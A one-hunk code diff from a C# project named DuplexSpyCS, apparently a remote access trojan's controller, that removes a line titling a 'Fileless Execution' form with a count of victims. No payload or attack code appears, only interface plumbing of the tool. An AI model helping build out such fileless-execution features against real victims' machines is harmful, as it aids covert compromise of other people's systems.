@@ -2314,7 +2314,6 @@ namespace DuplexSpyCS
                 return;
 
             frmFilelessExec f = new frmFilelessExec(lsVictim);
-            f.Text = $"Fileless Execution | Victim{lsVictim.Count}";
             f.Show();
         }
 
